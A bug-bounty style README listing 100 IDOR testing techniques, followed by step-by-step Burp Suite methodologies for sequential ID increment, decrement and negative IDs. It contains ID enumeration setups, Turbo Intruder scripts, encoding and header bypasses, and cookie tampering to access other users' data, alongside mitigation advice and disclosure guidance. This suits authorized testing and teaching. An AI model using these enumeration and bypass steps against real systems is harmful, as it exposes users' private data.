# idordz
idordz

# IDOR (Insecure Direct Object References) Top 100 Techniques

## 📋 **Introduction**
IDOR vulnerabilities occur when an application exposes direct references to internal objects (files, database records, etc.) without proper authorization checks. Here are 100 techniques organized by category.

---

## 🎯 **BASIC TECHNIQUES (1-15)**

### **Simple Parameter Manipulation**
1. **Sequential ID Increment** - Change `id=100` to `id=101`
2. **Sequential ID Decrement** - Change `id=100` to `id=99`
3. **Negative IDs** - Try `id=-1`, `id=-100`
4. **Zero ID** - Try `id=0`
5. **Large Numbers** - Try `id=999999999`

### **Format Variations**
6. **Decimal to Hex** - Convert `100` to `0x64`
7. **Decimal to Octal** - Convert `100` to `0144`
8. **Decimal to Binary** - `1100100` for 100
9. **Add leading zeros** - `00100` instead of `100`
10. **Scientific notation** - `1e2` for 100

### **Encoding Bypasses**
11. **URL Encoding** - `%31%30%30` for "100"
12. **Double URL Encoding** - `%2531%2530%2530`
13. **Unicode Encoding** - `\u0031\u0030\u0030`
14. **Base64 Encoding** - `MTAw` for "100"
15. **HTML Encoding** - `&#49;&#48;&#48;`

---

## 🔄 **PARAMETER LOCATION TECHNIQUES (16-30)**

### **Different Locations**
16. **URL Path** - `/api/user/100` to `/api/user/101`
17. **Query Parameter** - `?user_id=100` to `?user_id=101`
18. **POST Body** - Move ID from URL to POST data
19. **JSON Body** - `{"id":100}` to `{"id":101}`
20. **XML Body** - `<id>100</id>` to `<id>101</id>`
21. **Cookie Values** - Modify ID in cookies
22. **Session Variables** - Test session-based ID references
23. **HTTP Headers** - `X-User-ID: 100` to `X-User-ID: 101`
24. **Referer Header** - Modify IDs in Referer
25. **Multipart Parameters** - Change IDs in multipart forms

### **Parameter Pollution**
26. **Duplicate Parameters** - `?id=100&id=101` (server picks last)
27. **Array Parameters** - `id[]=100&id[]=101`
28. **Nested Parameters** - `user[id]=101`
29. **Parameter Prefix/Suffix** - `user_id=101`, `accountId=101`
30. **HTTP Parameter Pollution** - Test different combinations

---

## 🔢 **DATA TYPE VARIATIONS (31-45)**

### **Numeric Variations**
31. **Float values** - `id=100.1`
32. **Negative floats** - `id=-100.5`
33. **Comma separator** - `id=1,100`
34. **Signed/unsigned overflow** - `id=4294967295` (max 32-bit)
35. **Decimal with leading sign** - `id=+100`

### **String Manipulations**
36. **String IDs** - `username=admin` to `username=victim`
37. **Email addresses** - `email=user@example.com` to `victim@example.com`
38. **UUID/GUID** - Test predictable UUID patterns
39. **Hash IDs** - Try incrementing hashed values
40. **Token-based IDs** - Decode and modify JWT tokens

### **Special Characters**
41. **Wildcards** - Try `id=*` or `id=%`
42. **SQL patterns** - `id=%25` (URL encoded %)
43. **Path traversal** - `id=../100`
44. **Null byte injection** - `id=100%00`
45. **Line breaks** - `id=100%0a`

---

## 📊 **BATCH OPERATIONS (46-55)**

### **Mass Assignment**
46. **Batch endpoints** - `POST /api/users/batch` with multiple IDs
47. **Array of IDs** - `{"ids":[100,101,102]}`
48. **ID ranges** - `?id=100-200`
49. **CSV lists** - `?id=100,101,102`
50. **JSON Patch operations** - Test path values

### **Bulk Operations**
51. **Export functionality** - Try exporting other users' data
52. **Import functionality** - Import data to other accounts
53. **Mass delete** - Try deleting other users' items
54. **Bulk update** - Update multiple records
55. **Mass messaging** - Send messages to other users

---

## 🔗 **RELATIONSHIP-BASED TECHNIQUES (56-70)**

### **Related Objects**
56. **Parent-child relationships** - Access child objects via parent
57. **Related user content** - Access other users' posts/comments
58. **Shared resources** - Access other users' shared items
59. **Foreign keys** - Manipulate foreign key references
60. **Pivot tables** - Access many-to-many relationships

### **Indirect References**
61. **Referenced in comments** - Find IDs in comments
62. **Referenced in metadata** - Extract from meta tags
63. **In JavaScript files** - Find hardcoded IDs
64. **In API responses** - Gather valid IDs
65. **In error messages** - IDs may leak in errors

### **Temporal Relationships**
66. **Timestamp-based IDs** - Manipulate timestamps
67. **Date-based references** - `/reports/2024/01/01`
68. **Sequential timestamps** - Try earlier/later timestamps
69. **Session-based IDs** - Replay with different sessions
70. **Cache-based references** - Access cached content

---

## 🚀 **ADVANCED TECHNIQUES (71-85)**

### **Authentication Bypass**
71. **IDOR in password reset** - Reset other users' passwords
72. **Email verification** - Verify other accounts
73. **Profile update** - Update other users' profiles
74. **Account takeover** - Chain multiple IDORs
75. **Privilege escalation** - Access admin functions

### **File Operations**
76. **File downloads** - `download.php?file=user100.doc` to `user101.doc`
77. **File uploads** - Overwrite other users' files
78. **Profile pictures** - Access other users' images
79. **Document access** - View other users' documents
80. **Backup files** - Access system backups

### **Business Logic**
81. **Order manipulation** - View other users' orders
82. **Payment processing** - Modify payment references
83. **Subscription access** - Access other users' subscriptions
84. **Loyalty points** - Transfer/modify points
85. **Shopping cart** - View/modify others' carts

---

## 🛠️ **EXPLOITATION TECHNIQUES (86-100)**

### **Enumeration Techniques**
86. **ID enumeration** - Scan for valid IDs (1-1000)
87. **Wordlist-based** - Use common ID wordlists
88. **Pattern-based** - Identify ID patterns from public data
89. **Incremental enumeration** - Sequential scanning
90. **Random enumeration** - Test random IDs

### **Chaining & Combinations**
91. **IDOR + XSS** - Inject XSS via ID parameters
92. **IDOR + SQLi** - Test for SQL injection in IDs
93. **IDOR + SSRF** - Use IDOR to trigger SSRF
94. **IDOR + CSRF** - Combine with CSRF
95. **Multi-step IDOR** - Chain multiple IDORs

### **Response Analysis**
96. **Response time analysis** - Timing attacks on IDs
97. **Error message analysis** - Leaked information in errors
98. **Status code analysis** - 200 vs 403 vs 404
99. **Content length analysis** - Different lengths indicate valid/invalid
100. **Race conditions** - Test concurrent IDOR requests

---

## 📝 **Testing Methodology**

### **Reconnaissance Phase**
- Spider the application thoroughly
- Identify all parameters that reference objects
- Note authentication mechanisms
- Document API endpoints

### **Testing Phase**
1. Start with basic techniques
2. Progress to advanced techniques
3. Document all findings
4. Validate each finding manually
5. Check for business impact

### **Tools for IDOR Testing**
- Burp Suite (Intruder, Repeater)
- OWASP ZAP
- Postman
- Custom scripts (Python, Bash)
- FFUF for fuzzing
- Arjun for parameter discovery

### **Mitigation Strategies**
- Implement proper access controls
- Use indirect reference maps
- Validate user permissions server-side
- Avoid exposing database keys
- Implement rate limiting
- Use random, unpredictable IDs

---

# 🔍 **Full Burp Suite Methodology for Bug #1: Sequential ID Increment**

## **Bug Description:** Testing for simple sequential ID manipulation by incrementing numeric parameters

---

## 📋 **PREREQUISITES & SETUP**

### **Burp Suite Configuration**
```yaml
Burp Edition: Professional or Community
Required Tools:
  - Proxy
  - Repeater
  - Intruder
  - Target Scope
  - Engagement Tools
```

### **Initial Browser Setup**
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Install Burp CA certificate
3. Enable "Intercept is on" in Proxy tab
4. Disable browser cache (DevTools → Network → Disable cache)

---

## 🎯 **PHASE 1: RECONNAISSANCE & MAPPING**

### **Step 1.1: Site Map Generation**
```
Target → Site Map → [right-click] → Add to Scope
```

### **Step 1.2: Spider the Application**
```bash
1. Target tab → Site Map
2. Right-click domain → Spider this host
3. Check: "Spider application-specific links"
4. Max links: 1000+ for thorough coverage
```

### **Step 1.3: Identify Potential IDOR Endpoints**
Look for patterns in URLs and parameters:

**Common ID Patterns to Hunt:**
```
/user/profile?id=123
/account/view/456
/download.php?file=789
/api/users/1001
/orders?order_id=ABC123
/messages/thread/555
```

**Documentation:** Create a spreadsheet:
| Endpoint | Parameter | Value Type | Auth Required | HTTP Method |
|----------|-----------|------------|---------------|-------------|
| /profile | user_id | Numeric | Yes | GET |
| /download | file_id | Numeric | Yes | GET |
| /api/order | orderId | UUID | Yes | POST |

---

## 🔍 **PHASE 2: PASSIVE ANALYSIS**

### **Step 2.1: Review Proxy History**
```
Proxy → HTTP History
Filters: Show only in-scope items
Sort by: Parameter count, MIME type
```

**Look for:**
- Sequential numbers in URLs
- Numeric parameters in GET/POST
- File download endpoints
- User profile access points
- API endpoints with IDs

### **Step 2.2: Analyze JavaScript Files**
```
Target → Site Map → Filter: .js files
Right-click → Send to Repeater
Search in responses: "id", "userId", "account", "profile"
```

**Check for:**
- Hardcoded API endpoints
- ID generation patterns
- Client-side validation logic

### **Step 2.3: Map User Workflows**
Create test accounts: 
- User A (attacker@test.com)
- User B (victim@test.com)

**Test Actions:**
1. Create content as User A → Note ID
2. Create content as User B → Note ID
3. Compare ID patterns

---

## 🎯 **PHASE 3: ACTIVE TESTING WITH BURP**

### **Step 3.1: Manual Testing with Repeater**

#### **Basic ID Increment Test:**
```
Original Request:
GET /user/profile?id=100

Modified Request:
GET /user/profile?id=101
GET /user/profile?id=102
GET /user/profile?id=99
GET /user/profile?id=1000
```

**Procedure:**
1. Find request with numeric parameter
2. Right-click → Send to Repeater
3. Modify parameter value
4. Send request
5. Analyze response

#### **Response Analysis Checklist:**
```
✅ 200 OK with different user's data → CRITICAL FINDING
✅ 200 OK with partial data → Potential leak
✅ 403 Forbidden → Good (but test other methods)
✅ 404 Not Found → Try different ID ranges
✅ 302 Redirect → Check redirect location
✅ Different response size → Indicates valid/invalid
```

### **Step 3.2: Parameter Location Testing**

#### **Test Different Locations:**
```http
# Original
GET /api/user?id=100

# Test variations:
GET /api/user/100
GET /api/user?userId=100
GET /api/user?account_id=100
GET /api/user?uid=100
POST /api/user with body: id=100
POST /api/user with JSON: {"id": 100}
POST /api/user with XML: <id>100</id>
```

### **Step 3.3: HTTP Method Testing**

#### **Method Bypass Attempts:**
```http
# Original GET
GET /api/user/100

# Try other methods:
POST /api/user/100
PUT /api/user/100
DELETE /api/user/100
PATCH /api/user/100
OPTIONS /api/user/100
HEAD /api/user/100
```

---

## 🚀 **PHASE 4: AUTOMATED TESTING WITH INTRUDER**

### **Step 4.1: Basic Intruder Setup**

#### **Configuration:**
```
1. Request → Send to Intruder
2. Positions tab → Clear §
3. Highlight parameter value → Add §
   Example: user_id=§100§
4. Payloads tab → Payload set 1
5. Payload type: Numbers
```

#### **Number Payload Configuration:**
```
Number range: 1-1000
Number format: Decimal
Step: 1
Min integer digits: 1
Max integer digits: 6
```

### **Step 4.2: Advanced Intruder Payloads**

#### **Payload Set 1: Sequential Numbers**
```yaml
Type: Numbers
Range: 1 to 1000
Step: 1
```

#### **Payload Set 2: Negative/Zero Values**
```
-1000 to 1000
Include: -1, 0, 1
```

#### **Payload Set 3: Known Valid IDs**
```
Collect from:
- Your account activities
- Public profile pages
- Error messages
- API responses
```

### **Step 4.3: Intruder Attack Configurations**

#### **Attack Type: Sniper**
Best for testing single parameter with multiple values
```
One parameter: user_id=§100§
Results: Clear mapping of ID → response
```

#### **Attack Type: Cluster Bomb**
Best for testing multiple parameters
```
user_id=§100§&api_key=§key§
Tests combinations of IDs and API keys
```

### **Step 4.4: Grep - Match Configuration**

#### **Set up Response Analysis:**
```
Intruder → Options → Grep - Match
Add strings:
- "unauthorized"
- "forbidden"
- "access denied"
- "not found"
- victim username
- victim email
- "404"
- "403"
- "200 OK"
```

#### **Grep - Extract for Data Leakage:**
```
Extract patterns:
- Email addresses: \b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b
- Phone numbers: \b\d{3}[-.]?\d{3}[-.]?\d{4}\b
- Credit cards: \b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b
- Names: after "name": "([^"]*)"
```

---

## 📊 **PHASE 5: RESPONSE ANALYSIS**

### **Step 5.1: Sort and Filter Results**

#### **In Intruder Results Tab:**
```
1. Sort by Status Code
   - 200 OK → Potential hits
   - 403 → Check if bypassable
   - 500 → Possible injection

2. Sort by Response Length
   - Look for outliers
   - Compare with baseline
   - Note consistent patterns

3. Sort by Response Time
   - Timing differences
   - Potential valid IDs
```

### **Step 5.2: Response Comparison**

#### **Compare with Baseline:**
```python
# Baseline request (your ID: 100)
Length: 2450 bytes
Status: 200
Content: Contains your data

# Suspicious request (ID: 101)
Length: 3120 bytes
Status: 200  
Content: Contains victim's data ✓ VULNERABLE

# Invalid ID (9999)
Length: 450 bytes
Status: 404
Content: "Not found"
```

### **Step 5.3: Manual Verification**

#### **For Each Potential Finding:**
```
1. Send to Repeater
2. Test while logged in as User A
3. Test while logged in as User B
4. Test while logged out
5. Test with modified session
6. Document response differences
```

---

## 🔐 **PHASE 6: AUTHENTICATION BYPASS TESTING**

### **Step 6.1: Session Handling**

#### **Test with Different Auth States:**
```yaml
Scenario 1: Valid session, valid ID (baseline)
Scenario 2: Valid session, different user's ID
Scenario 3: No session, valid ID
Scenario 4: Expired session, valid ID
Scenario 5: Different user's session, their ID
Scenario 6: Different user's session, another ID
```

### **Step 6.2: Cookie Manipulation**

#### **Test Cases:**
```http
# Original
Cookie: session=abc123; user_id=100

# Remove session cookie
Cookie: user_id=101

# Modify session to different user
Cookie: session=xyz789; user_id=101

# Add admin flags
Cookie: session=abc123; user_id=101; admin=true
```

---

## 📝 **PHASE 7: DOCUMENTATION**

### **Step 7.1: Evidence Collection**

#### **Screenshot Requirements:**
```
1. Request showing ID modification
2. Response showing other user's data
3. Both requests side by side
4. HTTP history showing the chain
5. Burp Repeater window with comparison
```

#### **Request/Response Export:**
```xml
<!-- Save from Burp -->
Right-click request → Save item
Include: Full headers, body, timings
```

### **Step 7.2: Impact Assessment**

#### **Documentation Template:**
```markdown
# IDOR Vulnerability Report

## Vulnerability Type
Sequential ID Increment IDOR

## Endpoint
GET /api/user/profile?id=[ID]

## Affected Parameter
id (integer)

## Steps to Reproduce
1. Login as attacker (user: attacker@test.com)
2. Navigate to /profile
3. Capture request in Burp
4. Change id=100 to id=101
5. Forward request
6. Observe victim's data (user: victim@test.com)

## Proof of Concept
[Insert request/response]

## Impact
- Unauthorized access to victim's personal data
- PII exposure: name, email, address, phone
- Potential account takeover

## CVSS Score
7.5 (High) - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

## Remediation
Implement proper access controls checking user permissions server-side before returning data.
```

---

## 🛠️ **PHASE 8: ADVANCED BURP TECHNIQUES**

### **Step 8.1: Using Burp Extensions**

#### **Recommended Extensions:**
```
1. Autorize - Automatic authorization testing
2. Authz - Test with different cookies
3. JSON Web Tokens - JWT manipulation
4. Param Miner - Discover hidden parameters
5. Backslash Powered Scanner - Advanced scanning
```

### **Step 8.2: Custom Intruder Payloads**

#### **Python Payload Generator:**
```python
# Extender → Payloads → Payload processing
def generate_payloads():
    for i in range(1, 1000):
        yield str(i)
        yield hex(i)
        yield oct(i)
        yield base64.b64encode(str(i))
```

#### **Wordlist Creation:**
```bash
# Generate ID wordlist
seq 1 1000 > ids.txt
echo "0" >> ids.txt
echo "-1" >> ids.txt
for i in {1..100}; do echo "00$i"; done > leading_zeros.txt
```

### **Step 8.3: Macros for Authentication**

#### **Setup Auto-Re-authentication:**
```
Project options → Sessions → Session handling rules
Add rule: Run macro
Macro: Login and get session
Use for: All requests in Intruder
```

---

## ⚡ **PHASE 9: SPEED OPTIMIZATION**

### **Step 9.1: Intruder Resource Pools**

```
Intruder → Resource pool
Create new pool:
- Maximum concurrent requests: 5-10
- Delay between requests: 100-200ms
- Retry on network failure: Yes
```

### **Step 9.2: Filtering Noise**

#### **Set Up Match/Replace:**
```
Proxy → Options → Match and Replace
Add rules:
- Replace session token with macro-generated
- Remove cache headers
- Normalize Accept-Encoding
```

---

## 📈 **PHASE 10: VALIDATION & REPORTING**

### **Step 10.1: False Positive Check**

#### **Validation Steps:**
```
1. Re-test manually with fresh session
2. Test with different victim accounts
3. Verify data belongs to another user
4. Check if access is intentional feature
5. Test from different IP/location
6. Test at different times
```

### **Step 10.2: Generate Professional Report**

#### **Burp Report Features:**
```
1. Select findings in Target tab
2. Right-click → Report selected findings
3. Report type: HTML (for readability)
4. Include: Request/Response, Severity, Confidence
5. Add custom remediation advice
```

---

## 🎯 **SUCCESS INDICATORS**

### **Green Flags (Vulnerability Confirmed):**
- ✅ Access to another user's private data
- ✅ Modify another user's content
- ✅ Delete another user's data
- ✅ Perform actions as another user
- ✅ Consistent bypass across multiple IDs

### **Red Flags (False Positive):**
- ❌ Public information accessible
- ❌ Intended feature (shared resources)
- ❌ Cached responses
- ❌ Error messages only
- ❌ Inconsistent results

---

## 📚 **QUICK REFERENCE CHECKLIST**

```
[ ] Burp proxy configured
[ ] Browser certificate installed
[ ] Scope configured
[ ] Site map generated
[ ] Spider completed
[ ] JavaScript analyzed
[ ] Test accounts created
[ ] Repeater tests done
[ ] Intruder attacks configured
[ ] Responses analyzed
[ ] Findings verified
[ ] Documentation complete
[ ] Report generated
[ ] Remediation suggested
```

---

## 🚨 **EMERGENCY RESPONSE**

### **If You Find Live Data:**
```
1. STOP testing immediately
2. Document exactly what you accessed
3. Do not modify or download data
4. Report to program immediately
5. Clear any cached data
6. Follow disclosure guidelines
```

---

# Complete Methodology for Bug #2 (Sequential ID Decrement) in Burp Suite

## 🎯 **Bug #2: Sequential ID Decrement**
**Technique:** Changing `id=100` to `id=99` to access previous records

---

## 📋 **PREREQUISITES & SETUP**

### **Burp Suite Configuration**
```
1. Proxy Setup:
   - Intercept ON
   - Target scope configured
   - SSL pass through if needed

2. Extensions to Install:
   - Autorize (for authorization checks)
   - Authz (for privilege testing)
   - JSON Beautifier
   - Hackvertor
   - Turbo Intruder
```

### **Target Identification**
```
Look for endpoints with patterns:
- /api/user/123
- /profile?id=456
- /download?file_id=789
- /invoice/2024/001
- /document/abc-123-def
```

---

## 🔍 **PHASE 1: RECONNAISSANCE & MAPPING**

### **Step 1.1: Spider the Application**
```bash
1. Right-click on Target → Spider this host
2. Use Engagement Tools → Discover Content
3. Run active spider with intelligent matching
4. Check Robots and Sitemap
```

### **Step 1.2: Parameter Discovery**
**Using Burp Scanner:**
```
1. Target → Site map → Select domain
2. Right-click → Engagement Tools → Find parameters
3. Check "Test on all requests"
4. Run with thread count: 5-10
```

**Manual Parameter Hunting:**
```http
Check for patterns:
GET /api/user/123
GET /api/user?id=123
POST /api/user/getInfo
    Body: {"userId":123}
GET /download?file=report_123.pdf
POST /profile/update
    Body: user[id]=123
```

### **Step 1.3: Create Wordlists**
```python
# Generate sequential IDs (1-1000)
for i in range(1, 1001):
    print(i)

# Generate IDs with patterns
for i in range(1, 101):
    print(f"USER{i:04d}")  # USER0001
    print(f"ID-{i}")       # ID-1
    print(f"{i}.pdf")      # 1.pdf
```

---

## 🎯 **PHASE 2: BASELINE TESTING**

### **Step 2.1: Identify Authenticated Endpoint**
```http
1. Login to your account (User A)
2. Note your ID: 100
3. Access your resource: /api/user/100
4. Send request to Repeater (Ctrl+R)
```

### **Step 2.2: Baseline Request/Response**
```http
Original Request (Your Account):
GET /api/user/100 HTTP/1.1
Host: target.com
Cookie: session=abc123
Authorization: Bearer token123

Response:
HTTP/1.1 200 OK
{
    "id": 100,
    "username": "user100",
    "email": "user100@email.com",
    "role": "user",
    "data": "sensitive information"
}
```

---

## 🔬 **PHASE 3: SYSTEMATIC DECREMENT TESTING**

### **Step 3.1: Manual Decrement Test**
```http
1. Send original request to Repeater
2. Modify ID: 100 → 99
3. Send request
4. Analyze response

Request:
GET /api/user/99 HTTP/1.1

Expected vulnerability response:
HTTP/1.1 200 OK
{
    "id": 99,
    "username": "user99",
    "email": "user99@email.com",
    "data": "another user's data"  # 🚨 IDOR found!
}
```

### **Step 3.2: Systematic Range Testing**
**Using Burp Intruder - Sniper Attack:**

```
1. Send request to Intruder (Ctrl+I)
2. Highlight ID value: 100 → Add §100§
3. Payloads tab:
   - Payload type: Numbers
   - From: 1
   - To: 200
   - Step: 1
   - Format: Integer
   
4. Settings tab:
   - Grep - Match: ["error", "unauthorized", "403", "404"]
   - Grep - Extract: ["username", "email"]
   - Redirections: Always
```

### **Step 3.3: Analyze Results**
```bash
1. Sort by response length
2. Look for:
   - 200 OK responses (potential hits)
   - Same length as original (if using same account type)
   - Different length (different account/data)
   - Presence of user data fields
```

---

## 🚀 **PHASE 4: ADVANCED BURP TECHNIQUES**

### **Step 4.1: Cluster Bomb Attack for Multiple Users**
```http
GET /api/user?user_id=§100§&role=§user§

Payload Set 1: Numbers (1-100)
Payload Set 2: Common roles (user, admin, mod, guest)

Settings:
- Attack type: Cluster bomb
- Threads: 5
- Follow redirects: Never
```

### **Step 4.2: Pitchfork Attack for Targeted IDs**
```http
GET /api/user?start=§100§&end=§110§

Payload Set 1: [99, 98, 97, 96, 95]
Payload Set 2: [105, 104, 103, 102, 101]
```

### **Step 4.3: Use Turbo Intruder for Speed**
```python
# Turbo Intruder Python script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False)

    for i in range(90, 110):  # Test around your ID
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    if '200' in req.response and 'user' in req.response:
        print(f"Potential IDOR: ID={req.parameters}")
        table.add(req)
```

---

## 🔄 **PHASE 5: VARIATION TESTING**

### **Step 5.1: Different Endpoint Variations**
```http
1. Test all discovered endpoints:
   GET /api/profile/§100§
   GET /profile?user=§100§
   POST /api/getUser
       {"userId": §100§}
   GET /download?id=§100§
   GET /files/user_§100§.pdf
```

### **Step 5.2: HTTP Method Variations**
```http
Try different methods on same endpoint:

1. GET /api/user/100
2. POST /api/user/100
3. PUT /api/user/100
4. DELETE /api/user/100
5. PATCH /api/user/100
6. OPTIONS /api/user/100
```

### **Step 5.3: Header Manipulation**
```http
Test with modified headers:
GET /api/user/99 HTTP/1.1
Host: target.com
X-Original-URL: /api/user/100
X-Rewrite-URL: /api/user/99
X-Forwarded-For: 127.0.0.1
Referer: https://target.com/api/user/100
```

---

## 📊 **PHASE 6: RESPONSE ANALYSIS**

### **Step 6.1: Create Comparison Baseline**
```python
# Store original response (ID 100)
original_length = len(response_100)
original_content = response_100.content
original_status = 200

# Compare with test responses
for id in test_ids:
    if response.status == 200:
        if len(response.content) == original_length:
            print(f"Same type user: {id}")
        elif len(response.content) != original_length:
            print(f"Different data: {id} 🚨")
```

### **Step 6.2: Analyze Error Messages**
```http
Look for information disclosure in errors:

403 Forbidden - "User 99 not accessible"
404 Not Found - "User 99 doesn't exist"
200 OK but empty - Different access level
302 Redirect - Might redirect to login
```

### **Step 6.3: Timing Analysis**
**Using Burp Intruder with extract:**
```
1. Add to Settings → Grep - Extract
2. Configure to extract response time
3. Look for timing differences:
   - Valid IDs: slower (DB lookup)
   - Invalid IDs: faster (cached response)
   - Different users: variable timing
```

---

## 🔐 **PHASE 7: PRIVILEGE ESCALATION TESTING**

### **Step 7.1: Create Second Account**
```bash
1. Create User B with ID 150
2. Login as User B
3. Note accessible resources
4. Try accessing User B's data from User A
```

### **Step 7.2: Cross-Account Testing**
```http
1. Login as User A (ID 100)
2. Intercept request for /api/user/150 (User B)
3. Send to Repeater
4. Decrement IDs systematically
5. Check if you can access:
   - /api/user/149 (just below User B)
   - /api/user/151 (just above User B)
```

### **Step 7.3: Admin/Privileged Account Testing**
```http
1. Try to find admin endpoints:
   GET /admin/users/100
   GET /api/admin/user?id=99
   GET /management/user_profile.php?user=98
   
2. Attempt IDOR on these:
   - Lower IDs might be admin accounts
   - ID 1 is often admin
   - Sequential IDs from admin actions
```

---

## 🛡️ **PHASE 8: BYPASS TECHNIQUES**

### **Step 8.1: Parameter Pollution**
```http
Try multiple ID parameters:
GET /api/user?id=100&id=99
GET /api/user?user_id=100&user_id=99
GET /api/user?uid=100&user=99
POST /api/user
    user[id]=100&user[id]=99
```

### **Step 8.2: Encoding Bypass**
```http
Test encoded values:
GET /api/user/%39%39  # URL encoded "99"
GET /api/user/0x63     # Hex for 99
GET /api/user/0143     # Octal for 99
GET /api/user/MTEw     # Base64 for 99
GET /api/user/99%00    # Null byte
```

### **Step 8.3: Case Manipulation**
```http
If using string IDs:
GET /api/user/USER100
GET /api/user/user100
GET /api/user/User100
GET /api/user/uSeR100
```

---

## 📝 **PHASE 9: AUTOMATED SCANNING**

### **Step 9.1: Configure Active Scan**
```http
1. Right-click request → Do an active scan
2. Scan configuration:
   - Insert point: All parameters
   - Test with: All available payloads
   - Follow redirects: On
   
3. Custom scan checks:
   - Enable "Test for IDOR"
   - Check "Predictable tokens"
   - Enable "Parameter manipulation"
```

### **Step 9.2: Use Extensions**
```python
# Autorize Extension Setup
1. Install Autorize from BApp Store
2. Configure:
   - Set Cookie/Header for User A
   - Set Cookie/Header for User B
   - Enable "Auto comparer"
   
3. Run requests through Autorize
4. Check for:
   - Bypassed enforcement
   - Partial access
   - Information disclosure
```

---

## 📊 **PHASE 10: DOCUMENTATION**

### **Step 10.1: Create Proof of Concept**
```http
# Original request (User A accessing own data)
GET /api/user/100 HTTP/1.1
Cookie: session=USER_A_SESSION

Response shows User A's data

# POC request (User A accessing User B's data)
GET /api/user/99 HTTP/1.1
Cookie: session=USER_A_SESSION  # Same session!

Response:
{
    "id": 99,
    "username": "user99",      # Different user!
    "email": "user99@email.com",
    "private_data": "exposed"
}
```

### **Step 10.2: Impact Assessment**
```markdown
Vulnerability: IDOR via Sequential ID Decrement
Endpoint: /api/user/{id}
Method: GET

Impact Levels:
1. Information Disclosure: User PII exposed
2. Account Takeover: If combined with profile update
3. Data Manipulation: If POST/DELETE also vulnerable
4. Business Impact: Privacy violation, GDPR breach

Affected IDs: 90-110 (20 users)
Sensitive data exposed: Email, Phone, Address, Orders
```

### **Step 10.3: Report Template**
```markdown
# IDOR Vulnerability Report

## Vulnerability Type
Insecure Direct Object Reference (IDOR) via Sequential ID Decrement

## Affected Endpoint
`GET /api/user/{id}`

## Description
By decrementing the user ID parameter from 100 to 99, an authenticated user can access another user's private profile data without authorization.

## Steps to Reproduce
1. Login as user with ID 100
2. Intercept request to `/api/user/100`
3. Modify ID parameter to `99`
4. Forward request
5. Observe response contains User 99's data

## Proof of Concept
[Insert screenshots and HTTP traces]

## Impact
- Unauthorized access to 20+ user profiles
- Exposure of PII (email, phone, address)
- Potential for account takeover if other endpoints vulnerable
- GDPR/Data protection violation

## Remediation
- Implement proper authorization checks
- Use UUIDs instead of sequential IDs
- Apply principle of least privilege
- Add rate limiting on API endpoints

## CVSS Score
Base Score: 6.5 (Medium)
Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
```

---

## 🔧 **PHASE 11: ADVANCED BURP CONFIGURATIONS**

### **Step 11.1: Custom Intruder Payloads**
```python
# Python script for custom payload generation
def generate_payloads():
    payloads = []
    base_id = 100
    
    # Generate around target ID
    for offset in range(-20, 1):  # Decrement only
        payloads.append(str(base_id + offset))
    
    # Add encoded versions
    for p in payloads:
        payloads.append(urllib.parse.quote(p))
        payloads.append(base64.b64encode(p.encode()).decode())
    
    return payloads
```

### **Step 11.2: Session Handling**
```http
1. Project options → Sessions
2. Add session handling rule:
   - Check session is valid before each request
   - Auto-reauthenticate if needed
   - Maintain cookie jar
   
3. Macros for login:
   - Record login sequence
   - Update CSRF tokens automatically
   - Handle 2FA if present
```

### **Step 11.3: Match and Replace Rules**
```http
1. Proxy → Options → Match and Replace
2. Add rules:
   - Match: "id=100" → Replace: "id=99"
   - Match: "user/100" → Replace: "user/99"
   - Match: "userId":100 → Replace: "userId":99
   
3. Enable for automatic testing while browsing
```

---

## ✅ **FINAL VALIDATION CHECKLIST**

### **Confirmation Steps**
- [ ] Can access at least 3 different users' data
- [ ] Cannot access own data through this method (baseline)
- [ ] Vulnerability works with different session tokens
- [ ] Not rate-limited or blocked
- [ ] Works consistently over multiple attempts
- [ ] Data exposed is truly sensitive/private
- [ ] No additional authentication required
- [ ] Works across different browsers/devices

### **Scope Validation**
- [ ] Within authorized testing scope
- [ ] No data modification without permission
- [ ] No denial of service
- [ ] Exfiltrated only POC data
- [ ] Followed responsible disclosure process

---

## 📚 **COMMON BURP SHORTCUTS FOR THIS TEST**
```
Ctrl+R    - Send to Repeater
Ctrl+I    - Send to Intruder
Ctrl+F    - Find in response
Ctrl+Shift+B - Send to Comparer
Ctrl+Shift+X - Send to Extender
Ctrl+Shift+T - Target tab focus
Ctrl+Shift+P - Proxy tab focus
```

---

## 🎯 **KEY SUCCESS INDICATORS**

### **Positive Signs**
✅ 200 OK with different user data
✅ 200 OK with same structure but different content
✅ 302 Redirect to different user dashboard
✅ Partial data disclosure in responses
✅ Error messages revealing existence of users

### **Negative Signs**
❌ 403 Forbidden consistently
❌ 401 Unauthorized
❌ 404 Not Found for all attempts
❌ Rate limiting triggered
❌ Same data regardless of ID

---

## ⚠️ **SAFETY PRECAUTIONS**

1. **Rate Limiting**: Add delays between requests
2. **Scope**: Never test outside authorized scope
3. **Data Handling**: Don't download/save sensitive data
4. **Reporting**: Report immediately upon discovery
5. **Stop on WAF**: Cease testing if WAF blocks
6. **Session Management**: Use separate test accounts
7. **Logging**: Keep detailed logs for reporting

---

# 🎯 **IDOR Bug #3: Negative IDs - Full Burp Suite Methodology**

## **Bug Description:** Testing for IDOR by manipulating positive integers to negative values (e.g., `id=100` → `id=-100`, `id=-1`, `id=0`)

---

## 📊 **PHASE 1: RECONNAISSANCE & MAPPING**

### **1.1 Target Identification**
```
Target Application: https://target.com
Scope: All endpoints with numeric identifiers
```

### **1.2 Parameter Discovery**

#### **A. Manual Parameter Hunting**
```http
# Common parameter names to test
id
user_id
account_id
profile_id
document_id
file_id
order_id
transaction_id
payment_id
invoice_id
customer_id
member_id
product_id
item_id
record_id
reference_id
uid
pid
gid
```

#### **B. Using Burp Discovery Tools**

**1. Burp Spider/Crawler:**
- Right-click on target → `Spider this host`
- Check `Application → Sitemap` for all endpoints

**2. Burp Engagement Tools:**
```
Right-click on request → Engagement Tools → 
- Discover Content
- Find References
- Analyze Target
```

**3. Burp Scanner (Passive):**
```
Dashboard → New Scan → 
- Select "Passive" only
- Add target URLs
- Let it run while browsing
```

---

## 🔍 **PHASE 2: PASSIVE ANALYSIS**

